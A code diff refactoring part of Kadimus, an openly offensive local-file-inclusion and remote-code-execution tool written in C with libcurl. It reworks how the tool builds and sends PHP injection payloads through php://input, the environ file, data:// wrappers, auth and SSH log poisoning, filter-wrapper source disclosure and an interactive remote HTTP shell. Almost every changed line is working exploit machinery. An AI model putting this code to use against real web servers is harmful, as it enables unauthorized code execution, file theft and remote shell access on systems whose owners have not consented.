@@ -1,7 +1,11 @@
 #include "kadimus_xpl.h"
 
-void build_rce_exploit(CURL *curl, const char *php_code, rce_type tech, GET_DATA *GetParameters,
-const char *base_uri, size_t parameters_len, size_t inject_index);
+void build_rce_exploit(CURL *curl, const char *base_uri,
+    struct parameter_list *plist, size_t pos, rce_type tech,
+    const char *php_code);
+
+char *build_datawrap_url(const char *base, struct parameter_list *plist,
+    int p, const char *phpcode);
 
 bool check_auth_poison(const char *target){
     char *php_code=NULL, r_str[R_SIZE], regex[VULN_SIZE],
@@ -22,7 +26,7 @@ bool check_auth_poison(const char *target){
     build_regex(regex, r_str, "Vulnerable");
     php_code = make_code(r_str, "<?php echo \"Vulnerable\"; ?>", true);
 
-    build_rce_exploit(curl, php_code, AUTH, NULL, NULL, 0, 0);
+    build_rce_exploit(curl, NULL, NULL, 0, AUTH, php_code);
 
     if(HttpRequest(curl)){
         fflush(x);
@@ -83,13 +87,10 @@ bool ssh_log_poison(const char *target, int port){
 }
 
 
-void build_rce_exploit(CURL *curl, const char *php_code, rce_type tech, GET_DATA *GetParameters,
-    const char *base_uri, size_t parameters_len, size_t inject_index){
-
+void build_rce_exploit(CURL *curl, const char *base,
+    struct parameter_list *plist, size_t pos, rce_type tech,
+    const char *php_code){
     char *cookie_v = NULL;
-    char *b64x = NULL;
-    //char *uri_encode = NULL;
-    char *base_64_xpl = NULL;
     char *data_wrap_uri = NULL;
 
     if(tech == INPUT){
@@ -111,20 +112,9 @@ void build_rce_exploit(CURL *curl, const char *php_code, rce_type tech, GET_DATA
 
     } else if(tech == DATA){
 
-        b64x = b64encode(php_code);
-        //uri_encode = urlencode(b64x);
-        base_64_xpl = xmalloc( strlen(b64x)+ strlen(DATA_WRAP) + 1 );
-
-        strcpy(base_64_xpl, DATA_WRAP);
-        strcat(base_64_xpl, b64x);
-
-        data_wrap_uri = make_url(GetParameters, parameters_len, base_uri, base_64_xpl, inject_index, REPLACE);
+        data_wrap_uri = build_datawrap_url(base, plist, pos, php_code);
         curl_easy_setopt(curl, CURLOPT_URL, data_wrap_uri);
-
-        xfree(b64x);
-        //xfree(uri_encode);
-        xfree(data_wrap_uri);
-        xfree(base_64_xpl);
+        free(data_wrap_uri);
 
     } else if(tech == AUTH){
         curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(php_code));
@@ -136,7 +126,7 @@ char *build_datawrap_url(const char *base, struct parameter_list *plist, int p, 
     char *b64, *xpl, *ret;
     size_t b64_len;
 
-    b64 = b64encode(phpcode);
+    b64 = b64encode(phpcode, strlen(phpcode));
     b64_len = strlen(b64);
 
     xpl = xmalloc(b64_len + DATAWRAPLEN + 1);
@@ -269,7 +259,7 @@ int rce_scan(const char *base, struct parameter_list *plist, int p){
         rce_uri = build_url(base, plist, p, input_t[i], replace_string);
 
         curl_easy_setopt(curl, CURLOPT_URL, rce_uri);
-        build_rce_exploit(curl, php_code, INPUT, NULL, NULL, 0, 0);
+        build_rce_exploit(curl, NULL, NULL, 0, INPUT, php_code);
         info_single("requesting: %s\n", rce_uri);
 
         if(!HttpRequest(curl)){
@@ -308,7 +298,7 @@ int rce_scan(const char *base, struct parameter_list *plist, int p){
         info_single("requesting: %s\n", rce_uri);
 
         curl_easy_setopt(curl, CURLOPT_URL, rce_uri);
-        build_rce_exploit(curl, php_code, ENVIRON, NULL, NULL, 0, 0);
+        build_rce_exploit(curl, NULL, NULL, 0, ENVIRON, php_code);
 
         if(!HttpRequest(curl)){
             error_single("request error\n");
@@ -429,13 +419,10 @@ void source_disclosure_get(const char *uri, const char *filename, const char *p_
     char *xuri=NULL,*disc_xpl=NULL;
     char *base_uri=NULL;
     struct request body1, body2;
-
-    size_t parameters_len = 0;
+    struct parameter_list plist = {0};
     size_t inject_index = 0;
 
-    GET_DATA *GetParameters=NULL;
-
-    if(!get_element_pos(&GetParameters, &parameters_len, &base_uri, uri, p_name, &inject_index)){
+    if(!get_element_pos(&plist, &base_uri, uri, p_name, &inject_index)){
         printf("[-] Parameter: %s not found !!!\n",p_name);
         return;
     }
@@ -443,12 +430,13 @@ void source_disclosure_get(const char *uri, const char *filename, const char *p_
     disc_xpl = strcpy( xmalloc(strlen(filename)+strlen(FILTER_WRAP)+1), FILTER_WRAP);
     strcat(disc_xpl, filename);
 
-    xuri = make_url(GetParameters, parameters_len, base_uri, disc_xpl, inject_index, REPLACE);
+    xuri = build_url(base_uri, &plist, inject_index, disc_xpl, replace_string);
 
     xfree(disc_xpl);
     xfree(base_uri);
 
-    free_get_parameters(GetParameters, parameters_len);
+    free(plist.trash);
+    free(plist.parameter);
 
     CURL *ch1 = init_curl(&body1, true);
     CURL *ch2 = init_curl(&body2, true);
@@ -559,8 +547,8 @@ void exec_php(xpl_parameters xpl){
     char *rce_code_exec = NULL, **regex_out = NULL, *aux = NULL, *mmap_str,
     *base_uri = NULL, r_str[R_SIZE], regex[M_ALL_SIZE], random_file[20];
     FILE *x=NULL;
-    GET_DATA *GetParameters = NULL;
-    size_t parameters_len = 0, inject_index = 0, aux_len = 0;
+    struct parameter_list plist = {0};
+    size_t inject_index = 0, aux_len = 0;
     CURL *curl;
     struct curl_slist *chunk = NULL;
     struct request body;
@@ -581,7 +569,7 @@ void exec_php(xpl_parameters xpl){
     if(xpl.tech != DATA){
         curl_easy_setopt(curl, CURLOPT_URL, xpl.vuln_uri);
     } else {
-        if(!get_element_pos(&GetParameters, &parameters_len, &base_uri, xpl.vuln_uri, xpl.p_name, &inject_index)){
+        if(!get_element_pos(&plist, &base_uri, xpl.vuln_uri, xpl.p_name, &inject_index)){
             printf("[-] Parameter: %s not found !!!\n", xpl.p_name);
             curl_easy_cleanup(curl);
             xfree(body.ptr);
@@ -609,19 +597,19 @@ void exec_php(xpl_parameters xpl){
 
     if(xpl.tech == ENVIRON){
         chomp_all(rce_code_exec);
-        build_rce_exploit(curl, rce_code_exec, ENVIRON, NULL, NULL, 0, 0);
+        build_rce_exploit(curl, NULL, NULL, 0, ENVIRON, rce_code_exec);
     }
 
     else if(xpl.tech == INPUT){
-        build_rce_exploit(curl, rce_code_exec, INPUT, NULL, NULL, 0, 0);
+        build_rce_exploit(curl, NULL, NULL, 0, INPUT, rce_code_exec);
     }
 
     else if(xpl.tech == DATA){
-        build_rce_exploit(curl, rce_code_exec, DATA, GetParameters, base_uri, parameters_len, (size_t)inject_index);
+        build_rce_exploit(curl, base_uri, &plist, inject_index, DATA, rce_code_exec);
     }
 
     else if(xpl.tech == AUTH){
-        build_rce_exploit(curl, rce_code_exec, AUTH, NULL, NULL, 0, 0);
+        build_rce_exploit(curl, NULL, NULL, 0, AUTH, rce_code_exec);
     }
 
     if(HttpRequest(curl)){
@@ -657,7 +645,8 @@ void exec_php(xpl_parameters xpl){
 
     if(xpl.tech == DATA){
         xfree(base_uri);
-        free_get_parameters(GetParameters, parameters_len);
+        free(plist.trash);
+        free(plist.parameter);
     }
 
     xfree(rce_code_exec);
@@ -677,8 +666,7 @@ void rce_http_shell(const char *rce_uri, rce_type tech, const char *p_name){
     char *aux=NULL;
     char *php_code, random_file[20], *mmap_str;
     // php_code[1000+R_SIZE+R_SIZE+23],
-    GET_DATA *GetParameters = NULL;
-    size_t parameters_len = 0;
+    struct parameter_list plist={0};
     size_t inject_index = 0;
     struct request body;
     ssize_t nbytes = 0;
@@ -696,7 +684,7 @@ void rce_http_shell(const char *rce_uri, rce_type tech, const char *p_name){
     if(tech != DATA){
         curl_easy_setopt(curl, CURLOPT_URL, rce_uri);
     } else {
-        if(!get_element_pos(&GetParameters, &parameters_len, &base_uri, rce_uri, p_name, &inject_index)){
+        if(!get_element_pos(&plist, &base_uri, rce_uri, p_name, &inject_index)){
             printf("[-] Parameter: %s not found !!!\n",p_name);
             curl_easy_cleanup(curl);
             return;
@@ -741,15 +729,16 @@ void rce_http_shell(const char *rce_uri, rce_type tech, const char *p_name){
         }
 
         if(tech == INPUT)
-            build_rce_exploit(curl, php_code, INPUT, NULL, NULL, 0, 0);
+            build_rce_exploit(curl, NULL, NULL, 0, INPUT, php_code);
 
         else if(tech == ENVIRON)
-            build_rce_exploit(curl, php_code, ENVIRON, NULL, NULL, 0, 0);
+            build_rce_exploit(curl, NULL, NULL, 0, ENVIRON, php_code);
 
         else if(tech == DATA)
-            build_rce_exploit(curl, php_code, DATA, GetParameters, base_uri, parameters_len, (size_t)inject_index);
+            build_rce_exploit(curl, base_uri, &plist, inject_index, DATA, php_code);
+
         else if(tech == AUTH)
-            build_rce_exploit(curl, php_code, AUTH, NULL, NULL, 0, 0);
+            build_rce_exploit(curl, NULL, NULL, 0, AUTH, php_code);
 
         if(HttpRequest(curl)){
             if(tech == AUTH){
@@ -784,7 +773,8 @@ void rce_http_shell(const char *rce_uri, rce_type tech, const char *p_name){
 
     if(tech == DATA){
         xfree(base_uri);
-        free_get_parameters(GetParameters, parameters_len);
+        free(plist.trash);
+        free(plist.parameter);
     }
 
     curl_easy_cleanup(curl);
